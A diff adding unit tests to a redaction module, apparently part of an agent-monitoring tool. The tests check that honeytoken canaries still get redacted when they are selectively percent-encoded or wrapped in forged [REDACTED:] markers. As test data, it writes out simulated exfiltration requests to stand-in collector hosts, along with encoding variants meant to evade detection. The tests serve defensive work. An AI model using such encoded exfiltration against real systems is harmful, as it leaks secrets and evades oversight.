@@ -150,3 +150,107 @@ test('S2: markers themselves are never re-redacted (no match starts inside one o
   const { value } = redactString(`a ${AWS} b ${SSN} c`);
   assert.match(value, /^a \[REDACTED:aws_access_key:sha256=[0-9a-f]{16}\] b \[REDACTED:us_ssn:sha256=[0-9a-f]{16}\] c$/);
 });
+
+// ---- B3 (round 3): a canary with SELECTIVE %-encoding is matched on the %-decoded view ------------
+// The exfil URL is attacker-built, so any subset of the canary's characters may be %XX-encoded. That is
+// neither the raw form nor the fully-encoded hex form; the canary scan must also run on the decoded view.
+
+const HT3 = { id: 'HT', value: 'dvaa-admin-secret' };
+const HT3_NEEDLES = ['dvaa-admin-secret', 'admin-secret', 'admin%2Dsecret', 'vaa-admin'];
+// The reviewer's round-3 inputs, plus case / lowercase-hex / mid-word variants of the same class.
+const PARTIAL = [
+  'q=dvaa%2Dadmin%2Dsecret',
+  'q=%64vaa-admin-secret',
+  'q=d%76aa-admin-secret',
+  'q=%64%76%61%61-admin-secret',
+  'q=dvaa%2dadmin%2dsecret',
+  'q=DVAA%2DADMIN%2DSECRET',
+  'q=dvaa-admin-secre%74',
+  'q=xx%2Fdvaa%2Dadmin%2Dsecret%26y=1',
+];
+// Forged-wrapper variants: a marker look-alike (encoded or literal) around a selectively-encoded canary.
+const FORGED_PARTIAL = [
+  'q=%5BREDACTED:%64vaa-admin-secret%5D',
+  'q=%5bREDACTED:dvaa%2Dadmin%2Dsecret]',
+  'q=[REDACTED: d%76aa-admin-secret ]',
+  'q=%5BREDACTED%3A%20dvaa%2Dadmin%2Dsecret%20%5D',
+];
+
+/** leaks() plus a check that no decoded form of the canary survives anywhere outside our markers. */
+function canaryLeaks(value) {
+  const found = leaks(value, HT3_NEEDLES);
+  const stripped = value.replace(/\[REDACTED:[^\]]*\]/g, '');
+  let decoded;
+  try { decoded = decodeURIComponent(stripped.replace(/%(?![0-9a-f]{2})/gi, '%25')); } catch { decoded = stripped; }
+  if (decoded.toLowerCase().replace(/[^a-z0-9]/g, '').includes('dvaaadminsecret')) found.push('normalized canary');
+  return found;
+}
+
+test('B3: selectively %-encoded canaries (reviewer inputs + variants) are redacted', () => {
+  for (const s of PARTIAL) {
+    const { value, findings } = redactString(s, { canaries: [HT3] });
+    assert.deepEqual(canaryLeaks(value), [], `${s} leaked: ${value}`);
+    assert.ok(findings.some((f) => f.kind === 'canary' && f.canaryId === 'HT'), `${s}: no canary finding`);
+  }
+});
+
+test('B3: decoded-view hits map back to the exact original span (surrounding text kept)', () => {
+  const { value, findings } = redactString('q=xx%2Fdvaa%2Dadmin%2Dsecret%26y=1', { canaries: [HT3] });
+  assert.match(value, /^q=xx%2F\[REDACTED:canary:HT:sha256=[0-9a-f]{16}\]%26y=1$/);
+  assert.equal(findings.length, 1);
+  assert.match(findings[0].encoding, /\+url$/);
+});
+
+test('B3: a raw hit and a decoded-view hit of the same occurrence merge into one marker', () => {
+  // raw form present AND decodable bytes around it -> both scans hit the same span
+  const { value, findings } = redactString('a dvaa-admin-secret%20b', { canaries: [HT3] });
+  assert.match(value, /^a \[REDACTED:canary:HT:sha256=[0-9a-f]{16}\]%20b$/);
+  assert.equal(findings.length, 1);
+});
+
+test('B3: near-miss selectively-encoded strings are NOT redacted (no over-match)', () => {
+  for (const s of ['q=dvaa%2Dadmin%2Dsecreu', 'q=%64vaa-admin-secre', 'q=%64vaa-admin-sec%72e']) {
+    const { value, findings } = redactString(s, { canaries: [HT3] });
+    assert.equal(value, s, `over-redacted ${s}`);
+    assert.equal(findings.length, 0, s);
+  }
+  // "[" between parts is a separator: still the canary (separator-split form), still redacted
+  assert.deepEqual(canaryLeaks(redactString('q=dvaa%2Dadmin%2D%5Bsecret', { canaries: [HT3] }).value), []);
+});
+
+test('B3: forged-wrapper variants (%5B / %5b / literal / %3A) cannot hide a selectively-encoded canary', () => {
+  for (const s of FORGED_PARTIAL) {
+    const { value, findings } = redactString(s, { canaries: [HT3] });
+    assert.deepEqual(canaryLeaks(value), [], `${s} leaked: ${value}`);
+    assert.ok(findings.some((f) => f.canaryId === 'HT'), s);
+  }
+});
+
+test('B3: data-rich — selectively-encoded canaries beyond 8 KB of a 300-row tool output are all redacted', () => {
+  const variants = [...PARTIAL, ...FORGED_PARTIAL];
+  const rows = richRows((i) => `GET https://collector.example.test/in?${variants[i % variants.length].slice(2)}&n=${i}`);
+  const { value, findings } = redactDeep({ rows }, { canaries: [HT3] });
+  const out = value.rows.join('\n');
+  assert.deepEqual(canaryLeaks(out), [], 'canary leaked from rich output');
+  assert.equal(findings.filter((f) => f.canaryId === 'HT').length, rows.filter((r) => r.includes('collector')).length);
+});
+
+test('B3: data-rich — one large (>8 KB both sides) tool output string with the canary in the middle', () => {
+  const pad = (k) => Array.from({ length: 200 }, (_, i) => `row ${k}${i}: status=ok note=${'n'.repeat(40)}`).join('\n');
+  const s = `${pad('a')}\nfetch https://x.example.test/?d=d%76aa%2Dadmin-secret&z=1\n${pad('b')}`;
+  assert.ok(s.indexOf('d%76aa') > 8 * 1024 && s.length - s.indexOf('d%76aa') > 8 * 1024);
+  const { value } = redactString(s, { canaries: [HT3] });
+  assert.deepEqual(canaryLeaks(value), []);
+  assert.equal(value.length - s.length, value.match(/\[REDACTED:canary:HT:[^\]]*\]/)[0].length - 'd%76aa%2Dadmin-secret'.length);
+});
+
+test('B3: real seam — buildAlert never carries a selectively %-encoded canary (verdict canary)', () => {
+  const v = makeVerdict('honeytoken_exfil', 4, { canary: HT3 });
+  assert.ok(v.entities.sink && v.entities.toolCall, 'honeytoken_exfil verdicts carry a sink + tool call');
+  v.entities.sink.destination = 'https://collector.example.test/in?k=%64vaa%2Dadmin-secret';
+  v.entities.toolCall.argsPreview = '{"url":"https://c.example.test/?q=dvaa%2Dadmin%2Dsecret"}';
+  v.evidence = 'tool output: ' + 'x'.repeat(9000) + ' leaked q=%5BREDACTED:d%76aa-admin-secret%5D ' + 'y'.repeat(9000);
+  const a = buildAlert(v, warnSink());
+  assert.deepEqual(canaryLeaks(JSON.stringify(a)), []);
+  assert.ok(a.Redactions.ByKind.canary >= 1, JSON.stringify(a.Redactions));
+});
